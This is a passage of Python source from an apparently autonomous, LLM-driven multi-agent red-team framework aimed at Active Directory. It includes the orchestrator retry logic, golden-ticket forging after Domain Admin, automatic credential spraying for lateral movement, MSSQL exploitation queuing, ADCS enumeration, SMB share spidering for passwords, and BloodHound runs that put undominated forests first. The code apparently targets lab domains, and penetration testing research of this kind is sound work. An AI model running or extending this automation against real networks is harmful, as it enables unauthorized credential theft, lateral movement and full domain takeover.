                                f"backing off {delay}s: {e}"
                            )
                            await asyncio.sleep(delay)
                            continue  # Retry without incrementing crash count
                        # Exhausted rate limit retries - treat as crash
                        logger.error(
                            f"Rate limit retries exhausted ({rate_limit_count} attempts), "
                            "treating as crash"
                        )
                        # Fall through to crash handling

                    # Redis connection errors get special treatment - retry with backoff
                    # These are transient and should be retried even without progress
                    redis_error_keywords = [
                        "timeout",
                        "connection",
                        "connect",
                        "closed",
                        "broken pipe",
                        "reset",
                        "refused",
                    ]
                    if any(kw in error_str.lower() for kw in redis_error_keywords):
                        redis_retry_count += 1
                        if redis_retry_count <= max_redis_retries:
                            # Exponential backoff: 2, 4, 8, 16, 32 seconds
                            delay = min(2**redis_retry_count, 32)
                            logger.warning(
                                f"⏳ Redis connection error (attempt {redis_retry_count}/{max_redis_retries}), "
                                f"backing off {delay}s: {e}"
                            )
                            await asyncio.sleep(delay)
                            continue  # Retry without incrementing crash count
                        # Exhausted Redis retries - treat as crash
                        logger.error(
                            f"Redis retries exhausted ({redis_retry_count} attempts), "
                            "treating as crash"
                        )
                        # Fall through to crash handling

                    orchestrator_crash_count += 1
                    state = dispatcher.shared_state
                    has_progress = len(state.all_credentials) > 0 or len(state.all_hashes) > 0

                    logger.error(
                        f"Orchestrator crashed (attempt {orchestrator_crash_count}/{max_orchestrator_crashes}): {e}",
                        exc_info=True,
                    )

                    if has_progress and orchestrator_crash_count < max_orchestrator_crashes:
                        logger.warning(
                            f"Orchestrator crashed but has progress ({len(state.all_credentials)} creds, "
                            f"{len(state.all_hashes)} hashes). Continuing background tasks and retrying..."
                        )
                        # Give background tasks time to work before retrying
                        await asyncio.sleep(30)
                    elif not has_progress:
                        # No progress - fail fast
                        raise
                    else:
                        # Max crashes reached with progress - continue without orchestrator
                        logger.warning(
                            f"Orchestrator crashed {max_orchestrator_crashes} times. "
                            "Continuing with background tasks only."
                        )
                        break

        # Handle case where result is None (all retries failed but we have progress)
        if result is None:
            # Create a synthetic stop reason for the completion logic below
            class SyntheticResult:
                stop_reason = "orchestrator_crashed"
                steps = 0
                error = "Orchestrator crashed after max retries"

            result = SyntheticResult()  # type: ignore[assignment]

        stop_reason = getattr(result, "stop_reason", None)
        if (
            stop_reason == "max_steps_reached"
            and not dispatcher.shared_state.pending_tasks
            and not dispatcher.shared_state.completed
        ):
            from ares.core.config import get_multi_forest_mode

            pending_plaintext = bool(
                getattr(dispatcher.shared_state, "pending_credential_findings", set())
            )
            # In multi-forest mode, don't mark complete if foreign forests are undominated
            multi_forest_active = (
                get_multi_forest_mode() and not dispatcher.shared_state.all_forests_dominated()
            )
            if pending_plaintext:
                logger.warning(
                    f"Orchestrator stopped ({stop_reason}) but pending plaintext credentials exist; "
                    "keeping operation open"
                )
            elif multi_forest_active:
                undominated = dispatcher.shared_state.get_undominated_forests()
                logger.warning(
                    f"Orchestrator stopped ({stop_reason}) but multi-forest mode active "
                    f"with {len(undominated)} undominated forest(s): {', '.join(undominated)}; "
                    "keeping operation open for background workflows"
                )
            else:
                dispatcher.shared_state.completed = True
                logger.warning(
                    f"Orchestrator stopped ({stop_reason}) with no pending tasks; marking operation complete"
                )

        exploitation_status = await dispatcher.get_exploitation_status()
        if not dispatcher.shared_state.completed:
            has_pending_vulns = bool(exploitation_status.get("pending"))
            if not dispatcher.shared_state.pending_tasks and not has_pending_vulns:
                from ares.core.config import get_multi_forest_mode as _get_mf_mode

                pending_plaintext = bool(
                    getattr(dispatcher.shared_state, "pending_credential_findings", set())
                )
                multi_forest_active = (
                    _get_mf_mode() and not dispatcher.shared_state.all_forests_dominated()
                )
                if pending_plaintext:
                    logger.warning("Pending plaintext credentials exist; keeping operation open")
                elif multi_forest_active:
                    undominated = dispatcher.shared_state.get_undominated_forests()
                    logger.warning(
                        f"Multi-forest mode: {len(undominated)} undominated forest(s) "
                        f"({', '.join(undominated)}); keeping operation open"
                    )
                else:
                    dispatcher.shared_state.completed = True
                    if stop_reason == "error":
                        logger.warning(
                            "Orchestrator stopped with error; no pending tasks or unexploited "
                            "vulnerabilities, marking operation complete"
                        )
                    else:
                        logger.info(
                            "No pending tasks or unexploited vulnerabilities; marking operation complete"
                        )

        if dispatcher.shared_state.completed:
            # Log DA status if achieved before the wait loop
            if dispatcher.shared_state.has_domain_admin:
                logger.success(
                    f"Domain Admin achieved! (detected before wait loop) "
                    f"Path: {dispatcher.shared_state.domain_admin_path or 'unknown'}"
                )
            logger.info("Operation marked complete; skipping post-run wait")
            # Still wait for golden ticket if DA was achieved (same as _wait_for_completion does)
            # This is critical: _wait_for_completion() calls _wait_for_golden_ticket(), but when
            # the orchestrator marks the operation complete (no pending tasks), we skip it.
            # We must still forge the golden ticket before exiting!
            await _wait_for_golden_ticket(dispatcher)
            # Still wait for running crack tasks to complete
            await _wait_for_crack_tasks(dispatcher)
        else:
            # Wait for any remaining background tasks
            await _wait_for_completion(dispatcher, tasks, max_runtime=resolved_max_runtime)

        exploitation_status = await dispatcher.get_exploitation_status()

        # Get final state
        final_state = dispatcher.shared_state
        end_time = datetime.now(timezone.utc)

        # Refresh state from Redis before report generation
        # Workers write directly to Redis, but orchestrator memory doesn't auto-sync
        await final_state.refresh_from_redis()

        report_path = None
        report_markdown = None
        try:
            report_path, report_markdown = _generate_multi_agent_report(
                final_state,
                report_dir=report_dir,
                exploitation_status=exploitation_status,
            )
            # Persist report to Redis for CLI access
            if report_markdown and final_state._backend:
                await final_state._backend.store_report(report_markdown)
        except Exception as e:
            logger.warning(f"Failed to generate report for {operation_id}: {e}")

        # Offload to persistent store (PostgreSQL) for long-term retention
        ps_config = get_persistent_store_config()
        if ps_config.is_enabled and ps_config.offload_on_completion:
            try:
                store = PersistentStore(ps_config)
                if await store.initialize():
                    success = await store.offload_operation(final_state)
                    if success:
                        logger.info(f"Offloaded operation {operation_id} to persistent store")
                    else:
                        logger.warning(
                            f"Failed to offload operation {operation_id} to persistent store"
                        )
                    await store.close()
            except Exception as e:
                logger.warning(f"Persistent store offload failed for {operation_id}: {e}")

        # Final summary log before return
        duration = (end_time - start_time).total_seconds()
        da_status = "✅ DA ACHIEVED" if final_state.has_domain_admin else "❌ No DA"
        logger.success(
            f"Operation {operation_id} finished: {da_status} | "
            f"{len(final_state.all_credentials)} creds | {len(final_state.all_hashes)} hashes | "
            f"{duration:.0f}s runtime"
        )

        return {
            "operation_id": operation_id,
            "success": final_state.has_domain_admin,
            "domain_admin_achieved": final_state.has_domain_admin,
            "domain_admin_path": final_state.domain_admin_path,
            "golden_ticket_forged": final_state.has_golden_ticket,
            "credentials_discovered": len(final_state.all_credentials),
            "hashes_discovered": len(final_state.all_hashes),
            "hosts_discovered": len(final_state.all_hosts),
            "vulnerabilities_discovered": exploitation_status.get(
                "total_discovered",
                len(final_state.discovered_vulnerabilities),
            ),
            "vulnerabilities_exploited": exploitation_status.get(
                "total_succeeded",
                len(final_state.exploited_vulnerabilities),
            ),
            "tasks_completed": len(final_state.completed_tasks),
            "start_time": start_time.isoformat(),
            "end_time": end_time.isoformat(),
            "duration_seconds": (end_time - start_time).total_seconds(),
            "report_path": str(report_path) if report_path else None,
            "report_markdown": report_markdown,
        }

    except Exception as e:
        logger.error(f"Operation failed: {e}")
        raise

    finally:
        from ares.core.replay import shutdown_replay

        shutdown_replay()

        # Cleanup - cancel all tasks and suppress CancelledError
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

        # Release operation lock
        await task_queue.release_operation_lock(operation_id)
        await task_queue.disconnect()

        await dispatcher.stop()
        logger.info("Operation cleanup complete")


async def _create_orchestrator_agent(
    dispatcher: RedTeamDispatcher,
    model: str,
    max_steps: int,
    openai_api_key: str | None = None,
) -> Agent:
    """
    Create the orchestrator agent that coordinates the multi-agent operation.

    The orchestrator has:
    - Completion tools (complete_operation, announce_domain_admin) for stop conditions
    - OrchestratorTools for dispatching tasks to specialized worker agents
    - RedTeamReportingTools for recording findings and status

    The orchestrator does NOT execute exploitation tools directly. It delegates
    all tool execution to specialized worker agents (RECON, CREDENTIAL_ACCESS,
    CRACKER, ACL, PRIVESC, LATERAL, COERCION).

    Args:
        dispatcher: The dispatcher for inter-agent communication
        model: LLM model to use
        max_steps: Maximum agent steps
        openai_api_key: Optional OpenAI API key to bind directly to the generator

    Returns:
        Configured orchestrator agent
    """
    shared_state = dispatcher.shared_state
    # Ensure real-time publishing is enabled
    if not shared_state._dispatcher:
        shared_state.set_dispatcher(dispatcher)

    # Create orchestrator tools with dispatcher wired in
    # OrchestratorTools includes all orchestrator functionality:
    # - Stop conditions: complete_operation, announce_domain_admin
    # - Status: get_operation_summary, get_all_credentials, get_all_hashes, etc.
    # - Dispatch: dispatch_recon, dispatch_credential_access, etc.
    orchestrator_tools = OrchestratorTools()
    orchestrator_tools.set_dispatcher(dispatcher)
    orchestrator_tools.set_shared_state(shared_state)

    tools = [orchestrator_tools]

    # Load orchestrator-specific instructions
    # Pass shared_state for multi-forest mode context (undominated forests)
    instructions = load_agent_instructions(AgentRole.ORCHESTRATOR, shared_state)

    # Create hooks for monitoring and guidance
    hooks = create_role_hooks(AgentRole.ORCHESTRATOR, dispatcher, shared_state)

    logger.info(f"Creating orchestrator agent with {len(tools)} toolsets, max_steps={max_steps}")

    resolved_model = _resolve_model_generator(model, openai_api_key)
    return dn.Agent(
        name="ares-orchestrator",
        model=resolved_model,
        instructions=instructions,
        max_steps=max_steps,
        tools=tools,  # type: ignore[arg-type]
        hooks=hooks,
        stop_conditions=[
            tool_use("complete_operation"),
            tool_use("announce_domain_admin"),
        ],
        thread=Thread(),  # type: ignore[call-arg]
    )


def _generate_multi_agent_report(
    state: SharedRedTeamState,
    *,
    report_dir: str | Path | None,
    exploitation_status: dict[str, Any] | None = None,
) -> tuple[Path, str]:
    resolved_report_dir = Path(report_dir or "./reports").resolve()
    resolved_report_dir.mkdir(parents=True, exist_ok=True)

    # Set vulnerability/exploitation counts from status if provided
    if exploitation_status:
        state.vulnerability_count = exploitation_status.get(
            "total_discovered",
            len(state.discovered_vulnerabilities),
        )
        state.exploited_count = exploitation_status.get(
            "total_succeeded",
            len(state.exploited_vulnerabilities),
        )

    report_generator = RedTeamReportGenerator()
    report_content = report_generator.generate(state)

    report_filename = f"{state.operation_id}_report.md"
    report_path = resolved_report_dir / report_filename
    report_path.write_text(report_content)
    logger.success(f"Red team report generated: {report_path}")
    return report_path, report_content


async def _create_agent_ensemble(
    dispatcher: RedTeamDispatcher,
    model: str,
    max_steps: int,
    namespace: str,
) -> dict[AgentRole, AgentInfo]:
    """
    Create the agent ensemble with role-specific configurations.

    Capabilities are loaded from config (single source of truth).

    Args:
        dispatcher: The dispatcher instance
        model: LLM model to use
        max_steps: Maximum agent steps
        namespace: Kubernetes namespace

    Returns:
        Dict mapping roles to agent info
    """
    agents: dict[AgentRole, AgentInfo] = {}

    # All roles to create
    roles_to_create = [
        AgentRole.RECON,
        AgentRole.CREDENTIAL_ACCESS,
        AgentRole.CRACKER,
        AgentRole.ACL,
        AgentRole.PRIVESC,
        AgentRole.LATERAL,
        AgentRole.COERCION,
    ]

    for role in roles_to_create:
        # Get capabilities from config (single source of truth)
        config_key = role.value  # e.g., "recon", "credential_access"
        agent_config = get_agent_config(config_key)
        capabilities = set(agent_config.capabilities)

        name = f"ares-{role.value.replace('_', '-')}"
        agent_info = AgentInfo(
            name=name,
            pod_name=f"{name}-0",  # Will be updated by K8s discovery
            role=role,
            capabilities=capabilities,
            status="idle",
        )
        agents[role] = agent_info

    return agents


async def _monitor_agent_health(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task to monitor agent health.

    Monitors agent heartbeats and alerts on:
    - Agents going offline
    - Agents reporting errors in heartbeat data
    - Agents persistently offline (3+ consecutive checks)

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between health checks
    """
    offline_counts: dict[str, int] = {}  # Track consecutive offline counts

    while True:
        try:
            agent_status = dispatcher.get_agent_status()

            offline_agents = [
                name for name, status in agent_status.items() if status["status"] == "offline"
            ]

            # Track consecutive offline counts
            for agent_name in agent_status:
                if agent_name in offline_agents:
                    offline_counts[agent_name] = offline_counts.get(agent_name, 0) + 1
                else:
                    offline_counts[agent_name] = 0

            # Alert on newly offline agents
            if offline_agents:
                for agent_name in offline_agents:
                    count = offline_counts.get(agent_name, 0)
                    if count == 1:
                        # First time offline - ERROR level
                        logger.error(f"Agent {agent_name} is now OFFLINE")
                    elif count == 3:
                        # Persistently offline - CRITICAL level
                        logger.critical(
                            f"Agent {agent_name} has been offline for {count} consecutive checks "
                            f"({count * check_interval:.0f}s). This may indicate a fatal error "
                            "such as authentication failure or misconfiguration."
                        )
                    elif count > 3 and count % 10 == 0:
                        # Remind every 10 checks if still offline
                        logger.critical(
                            f"Agent {agent_name} still offline after {count} checks "
                            f"({count * check_interval:.0f}s)"
                        )

            await asyncio.sleep(check_interval)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Health monitor error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _extend_operation_lock(
    task_queue: RedisTaskQueue,
    operation_id: str,
    interval: float = 600.0,
) -> None:
    """
    Periodically extend the operation lock to prevent expiry during long operations.

    Args:
        task_queue: The task queue with lock methods
        operation_id: Operation ID to extend lock for
        interval: Seconds between lock extensions (default: 10 minutes)
    """
    while True:
        await asyncio.sleep(interval)
        try:
            success = await task_queue.extend_operation_lock(operation_id)
            if not success:
                logger.warning(f"Failed to extend lock for operation {operation_id}")
        except Exception as e:
            logger.error(f"Error extending operation lock: {e}")


def _should_stop_background_task(state: SharedRedTeamState) -> bool:
    """Check if a background task should terminate.

    In single-domain mode: stop when DA achieved or completed.
    In multi-forest mode: stop only when ALL forests dominated or completed.
    """
    if state.completed:
        return True
    if not state.has_domain_admin:
        return False
    # DA achieved — check if multi-forest mode requires continuing
    if get_multi_forest_mode():
        return state.all_forests_dominated()
    return True


async def _auto_credential_expansion(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 10.0,  # Reduced from 30s for faster lateral testing
    min_hosts: int = 1,
) -> None:
    """
    Background task that automatically triggers credential expansion when new credentials appear.

    Monitors the shared state for new credentials and dispatches lateral movement
    tests without requiring the orchestrator LLM to explicitly call trigger_credential_expansion.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between credential checks
        min_hosts: Minimum hosts required before triggering expansion
    """
    from ares.core.workflows import credential_expansion_loop

    # NOTE: processed credentials persisted in state.processed_expansion_creds for restart recovery
    expansion_running = False

    def _make_expansion_key(username: str, domain: str, password: str) -> str:
        return f"{domain.lower()}:{username.lower()}:{hash(password or '')}"

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete (multi-forest aware)
            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping auto credential expansion")
                break

            # Skip if not enough hosts discovered yet
            if len(state.all_hosts) < min_hosts:
                logger.debug(
                    f"Waiting for hosts ({len(state.all_hosts)}/{min_hosts}) before credential expansion"
                )
                continue

            # Check for new credentials (not yet in persisted state)
            new_creds = [
                c
                for c in state.all_credentials
                if _make_expansion_key(c.username, c.domain or "", c.password or "")
                not in state.processed_expansion_creds
            ]

            if new_creds and not expansion_running:
                logger.info(
                    f"Auto-expansion: {len(new_creds)} new credential(s) detected, "
                    f"triggering lateral movement tests against {len(state.all_hosts)} hosts"
                )

                expansion_running = True
                try:
                    await credential_expansion_loop(dispatcher, max_iterations=3)
                except Exception as e:
                    logger.warning(f"Credential expansion failed: {e}")
                finally:
                    expansion_running = False
                    # Mark all current creds as processed (persist to state)
                    for c in state.all_credentials:
                        key = _make_expansion_key(c.username, c.domain or "", c.password or "")
                        state.processed_expansion_creds.add(key)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto credential expansion error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_mssql_detection(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 60.0,
) -> None:
    """
    Background task that periodically scans for MSSQL hosts and queues vulnerabilities.

    This catches MSSQL hosts discovered by worker agents that don't go through
    the orchestrator's publish_host() method.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between MSSQL scans
    """
    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete (multi-forest aware)
            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping MSSQL detection")
                break

            # Skip if no hosts discovered yet
            if not state.all_hosts:
                logger.debug("MSSQL scanner: no hosts discovered yet")
                continue

            # Always scan all hosts - dispatcher handles deduplication via already_queued check
            # This ensures we catch hosts whose services were updated after initial discovery
            queued = await dispatcher.scan_hosts_for_mssql()

            if queued > 0:
                logger.info(
                    f"🗄️ Auto-detected MSSQL: queued {queued} vulnerability(ies) for exploitation"
                )

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"MSSQL detection error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_adcs_enumeration(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 45.0,
    max_retries: int = 2,
) -> None:
    """
    Background task that automatically runs ADCS enumeration when:
    1. ADCS servers are detected (CertEnroll share indicator)
    2. Credentials are available for authentication

    This catches ADCS servers discovered by worker agents and triggers
    certipy_find to enumerate ESC1-ESC15 vulnerabilities.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between ADCS checks
        max_retries: Maximum retry attempts per server (reduced to avoid blocking privesc queue)
    """
    # Track (server, user, domain) -> (task_id, attempt_count, last_attempt_time)
    adcs_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
    # NOTE: successful_servers persisted in state.processed_adcs_servers for restart recovery
    failed_servers: set[str] = set()  # Servers that consistently fail - transient
    retry_cooldown = 60.0  # Wait 1 minute before retrying failed tasks
    stuck_task_timeout = 480.0  # Consider tasks stuck after 8 minutes
    # Track foreign domain ADCS probes by (domain, username) - re-probe when new creds appear
    probed_adcs_domain_creds: set[tuple[str, str]] = set()

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete (multi-forest aware)
            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping ADCS enumeration")
                break

            # Need credentials to enumerate ADCS
            if not state.all_credentials:
                logger.debug("ADCS scanner: waiting for credentials")
                continue

            # Build current domain set (computed from state each iteration)
            # Include ALL known domains, not just credential domains — cross-trust
            # creds can authenticate to foreign domain CAs for certipy find.
            _iter_domains: set[str] = set()
            if state.target and state.target.domain:
                _iter_domains.add(state.target.domain)
            for cred in state.all_credentials:
                if cred.domain:
                    _iter_domains.add(cred.domain)
            # Include trusted domains and host domains for foreign ADCS discovery
            for td in state.trusted_domains:
                if td:
                    _iter_domains.add(td.lower())
            for host in state.all_hosts:
                if host.hostname and "." in host.hostname:
                    parts = host.hostname.lower().split(".", 1)
                    if len(parts) > 1 and not parts[1].endswith(".internal"):
                        _iter_domains.add(parts[1])

            current_time = asyncio.get_event_loop().time()

            # Find ADCS servers (hosts with CertEnroll share)
            adcs_servers = dispatcher.find_adcs_servers()

            # Try to enumerate each ADCS server with available credentials
            for server_ip, server_hostname in adcs_servers:
                # Skip servers we've already successfully enumerated (persisted in state)
                if server_ip in state.processed_adcs_servers:
                    continue

                # Skip servers that have consistently failed (stop wasting privesc queue time)
                if server_ip in failed_servers:
                    continue

                # Count total failures for this server across all credentials
                server_failure_count = sum(
                    1 for k, v in adcs_attempts.items() if k[0] == server_ip and v[1] >= max_retries
                )
                if server_failure_count >= 2:
                    logger.warning(
                        f"⏭️ Auto-ADCS: Skipping {server_ip} - failed with multiple credentials"
                    )
                    failed_servers.add(server_ip)
                    continue

                # Determine server's domain from hostname for credential matching
                server_domain = ""
                if server_hostname and "." in server_hostname:
                    server_domain = server_hostname.lower().split(".", 1)[1]

                # Sort credentials: same-domain first, admin first, filter placeholders
                sorted_creds = sorted(
                    [c for c in state.all_credentials if c.has_usable_password],
                    key=lambda c: (
                        0 if server_domain and (c.domain or "").lower() == server_domain else 1,
                        0 if c.is_admin else 1,
                    ),
                )

                for cred in sorted_creds:
                    cred_key = (server_ip, cred.username, cred.domain or "")

                    # Check if we've already attempted with this credential
                    if cred_key in adcs_attempts:
                        task_id, attempt_count, last_attempt = adcs_attempts[cred_key]

                        # Check if the task completed successfully
                        task_info = state.pending_tasks.get(task_id)
                        if task_info and task_info.status == TaskStatus.COMPLETED:
                            state.processed_adcs_servers.add(server_ip)
                            logger.info(f"ADCS enumeration succeeded for {server_ip}")
                            break

                        # Skip if max retries reached
                        if attempt_count >= max_retries:
                            continue

                        # Skip if still in cooldown
                        if current_time - last_attempt < retry_cooldown:
                            continue

                        # Check for stuck tasks (running > 8 minutes without completion)
                        if task_id in state.pending_tasks:
                            elapsed = current_time - last_attempt
                            if elapsed > stuck_task_timeout:
                                logger.warning(
                                    f"⏰ Auto-ADCS: Task {task_id} stuck for {elapsed:.0f}s, "
                                    f"marking {server_ip} as failed"
                                )
                                # Increment failure count to skip retries
                                adcs_attempts[cred_key] = (task_id, max_retries, last_attempt)
                                continue
                            # Task still in progress and not stuck yet
                            continue

                        # Task not in pending_tasks means it completed/failed
                        logger.info(
                            f"🔄 Auto-ADCS: Retrying {server_ip} with {cred.domain}\\{cred.username} "
                            f"(attempt {attempt_count + 1}/{max_retries})"
                        )
                    else:
                        attempt_count = 0

                    # Find the best domain for this enumeration
                    target_domain = cred.domain
                    if not target_domain:
                        target_domain = state.target.domain if state.target else ""
                    if not target_domain and _iter_domains:
                        target_domain = next(iter(_iter_domains))

                    if not target_domain:
                        continue

                    logger.info(
                        f"🔐 Auto-ADCS: Found ADCS server {server_ip} ({server_hostname}), "
                        f"dispatching certipy_find with {cred.domain}\\{cred.username}"
                    )

                    task_id = await dispatcher.request_adcs_enumeration(
                        source_agent="orchestrator",
                        target_ip=server_ip,
                        domain=target_domain,
                        username=cred.username,
                        password=cred.password,
                    )

                    # Always record attempt to prevent retry storm when throttled
                    # The deferred queue handles actual retries for deferred tasks
                    adcs_attempts[cred_key] = (task_id or "", attempt_count + 1, current_time)
                    if task_id:
                        logger.info(f"ADCS enumeration task {task_id} dispatched for {server_ip}")
                    # Only dispatch one task per server per cycle
                    break

            # --- Foreign domain ADCS probing (no CertEnroll share needed) ---
            # For foreign domains in multi-forest mode, shares may not be enumerated.
            # Probe DCs directly with certipy find when we have domain credentials.
            if get_multi_forest_mode():
                target_domain = (
                    state.target.domain.lower() if state.target and state.target.domain else ""
                )
                for domain in _iter_domains:
                    domain_lower = domain.lower()
                    # Skip primary target domain (already handled via CertEnroll detection)
                    if domain_lower == target_domain:
                        continue
                    # Need a DC IP for this domain
                    dc_ip = state.domain_controllers.get(domain_lower)
                    if not dc_ip:
                        continue
                    # Skip if we already enumerated this DC via CertEnroll path
                    if dc_ip in state.processed_adcs_servers:
                        continue
                    # Find credentials for this domain (prefer same-domain, then admin)
                    # Try each credential we haven't probed with yet
                    for cred in sorted(
                        [c for c in state.all_credentials if c.has_usable_password],
                        key=lambda c: (
                            0 if (c.domain or "").lower() == domain_lower else 1,
                            0 if c.is_admin else 1,
                        ),
                    ):
                        probe_key = (domain_lower, cred.username.lower())
                        if probe_key in probed_adcs_domain_creds:
                            continue

                        logger.info(
                            f"🔐 Auto-ADCS: Probing foreign domain {domain} DC {dc_ip} "
                            f"with {cred.domain}\\{cred.username} (no CertEnroll needed)"
                        )
                        task_id = await dispatcher.request_adcs_enumeration(
                            source_agent="orchestrator",
                            target_ip=dc_ip,
                            domain=domain,
                            username=cred.username,
                            password=cred.password,
                        )
                        probed_adcs_domain_creds.add(probe_key)
                        if task_id:
                            logger.info(
                                f"ADCS foreign domain probe task {task_id} dispatched "
                                f"for {domain} with {cred.username}"
                            )
                        # Only dispatch one probe per domain per cycle
                        break

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"ADCS enumeration error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_share_spider(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
) -> None:
    """
    Background task that automatically spiders discovered shares for credentials.

    When shares with READ access are discovered and we have valid credentials,
    dispatch share_spider tasks to search for sensitive files like:
    - Configuration files with passwords
    - Scripts with hardcoded credentials
    - Text files with credential information

    This catches common scenarios like credentials stored in share files.
    """
    # NOTE: spidered shares persisted in state.processed_spidered_shares ("host:share:user:domain")

    while True:
        try:
            state = dispatcher.shared_state

            # Only stop when operation is explicitly completed, NOT when DA is achieved
            # We still want to spider shares after DA to find additional credentials and loot
            if state.completed:
                logger.debug("Operation complete, stopping auto share spider")
                break

            # Need credentials to spider shares (authenticated access)
            if not state.all_credentials:
                await asyncio.sleep(check_interval)
                continue

            # Find shares with READ access (excluding admin shares)
            readable_shares = [
                share
                for share in state.all_shares
                if share.permissions
                and "READ" in share.permissions.upper()
                and share.name.lower() not in ("ipc$", "print$")
                # Skip admin shares - focus on custom shares like "all", "public"
                and share.name.lower() not in ("admin$", "c$", "d$", "e$")
            ]

            if not readable_shares:
                await asyncio.sleep(check_interval)
                continue

            # For each readable share, try to spider with available credentials
            for share in readable_shares:
                for cred in state.all_credentials:
                    if not cred.has_usable_password:
                        continue  # Need real password for SMB auth

                    # Create unique key for this spider attempt (persisted in state)
                    spider_key = (
                        f"{share.host.lower()}:{share.name.lower()}:"
                        f"{cred.username.lower()}:{(cred.domain or '').lower()}"
                    )

                    if spider_key in state.processed_spidered_shares:
                        continue

                    # Dispatch share spider task
                    domain = cred.domain or (state.target.domain if state.target else "")
                    task_id = await dispatcher.request_credential_access(
                        source_agent="orchestrator",
                        domain=domain,
                        target_ips=[share.host],
                        username=cred.username,
                        password=cred.password,
                        reason=f"auto_share_spider_{share.name}",
                        techniques=["smbclient_spider"],
                    )

                    # Always mark as processed to prevent retry storm when throttled
                    state.processed_spidered_shares.add(spider_key)
                    if task_id:
                        logger.info(
                            f"🕷️ Auto share spider dispatched: {cred.domain or '(local)'}\\{cred.username} -> {share.host}/{share.name} (task {task_id})"
                        )
                    # Only spider each share once per credential - don't flood
                    break

            await asyncio.sleep(check_interval)

        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"Auto share spider error: {e}", exc_info=True)
            await asyncio.sleep(check_interval)


async def _auto_bloodhound(
    dispatcher: RedTeamDispatcher,
    check_interval: float = 30.0,
    max_retries: int = 3,
) -> None:
    """
    Background task that automatically runs BloodHound when credentials are discovered.

    BloodHound collection is critical for finding attack paths to Domain Admin.
    This ensures it runs early once we have valid credentials, without relying
    on the orchestrator to remember to dispatch it.

    Args:
        dispatcher: The dispatcher instance
        check_interval: Seconds between checks for new credentials
        max_retries: Maximum retry attempts per domain
    """
    # Track (domain, username) -> (task_id, attempt_count, last_attempt_time)
    bloodhound_attempts: dict[tuple[str, str, str], tuple[str, int, float]] = {}
    # NOTE: successful domains persisted in state.processed_bloodhound_domains for restart recovery
    retry_cooldown = 120.0  # Wait 2 minutes before retrying failed tasks

    while True:
        try:
            await asyncio.sleep(check_interval)

            state = dispatcher.shared_state

            # Skip if operation is complete (multi-forest aware)
            if _should_stop_background_task(state):
                logger.debug("Operation complete, stopping BloodHound automation")
                break

            # Need credentials to run BloodHound
            if not state.all_credentials:
                logger.debug("BloodHound scanner: waiting for credentials")
                continue

            # Build current domain set (computed from state each iteration)
            _iter_domains: set[str] = set()
            if state.target and state.target.domain:
                _iter_domains.add(state.target.domain.lower())
            for cred in state.all_credentials:
                if cred.domain:
                    _iter_domains.add(cred.domain.lower())
            # Include trusted domains discovered via BloodHound/nltest
            for trusted in state.trusted_domains:
                if trusted:
                    _iter_domains.add(trusted.lower())
            # Also include domains from discovered hosts (parent/sibling domains)
            for host in state.all_hosts:
                if host.hostname and "." in host.hostname:
                    # Extract domain from FQDN (e.g., dc.parent.local -> parent.local)
                    parts = host.hostname.lower().split(".", 1)
                    if len(parts) > 1:
                        host_domain = parts[1]
                        if host_domain and not host_domain.endswith(".internal"):
                            _iter_domains.add(host_domain)

            if not _iter_domains:
                continue

            current_time = asyncio.get_event_loop().time()

            # Prioritize undominated foreign forests over domains we already own.
            # Without this, BloodHound wastes cycles re-enumerating sevenkingdoms.local
            # while essos.local (the actual target) waits in the queue.
            da_domains = {d.lower() for d in state.domain_admin_domains}
            target_domain = (
                state.target.domain.lower() if state.target and state.target.domain else ""
            )

            def _bh_domain_priority(
                d: str,
                _da_domains: set[str] = da_domains,
                _target_domain: str = target_domain,
            ) -> int:
                dl = d.lower()
                # Undominated foreign forests first (highest priority)
                if (
                    dl not in _da_domains
                    and dl != _target_domain
                    and not dl.endswith("." + _target_domain)
                ):
                    return 0
                # Target domain (initial attack surface)
                if dl == _target_domain:
                    return 1
                # Child domains of target
                if dl.endswith("." + _target_domain):
                    return 2
                # Already dominated domains last
                return 3

            sorted_domains = sorted(_iter_domains, key=_bh_domain_priority)

            # Try to run BloodHound for each domain
            for domain in sorted_domains:
                domain_lower = domain.lower()
                # Skip domains we've already successfully enumerated (persisted in state)
                # EXCEPTION: re-run with native creds if first run used cross-trust creds.
                # Cross-trust BloodHound may miss user-to-user ACLs (e.g., missandei→khal.drogo)
                # that are only visible to same-domain authenticated users.
                if domain_lower in state.processed_bloodhound_domains:
                    # Check if we now have a NATIVE credential we haven't tried yet
                    native_creds = [
                        c
                        for c in state.all_credentials
                        if c.has_usable_password and (c.domain or "").lower() == domain_lower
                    ]
                    has_untried_native = any(
                        (domain_lower, c.username.lower(), domain_lower) not in bloodhound_attempts
                        for c in native_creds
                    )
                    if not has_untried_native:
                        continue
                    # We have a native cred we haven't tried — re-enumerate for better ACL data
                    logger.info(
                        f"🩸 Auto-BloodHound: Re-enumerating {domain} with native credential "
